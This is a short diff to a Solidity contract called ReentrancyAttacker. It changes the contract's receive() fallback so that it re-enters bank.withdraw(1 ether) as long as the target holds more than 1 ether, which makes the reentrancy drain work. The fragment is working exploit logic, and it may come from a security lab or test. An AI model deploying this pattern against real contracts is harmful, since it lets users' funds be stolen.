@@ -16,6 +16,8 @@ contract ReentrancyAttacker {
     }
 
     receive() external payable {
-        bank.withdraw(1000000);
+        if (address(bank).balance > 1 ether) {
+            bank.withdraw(1 ether);
+        }
     }
 }
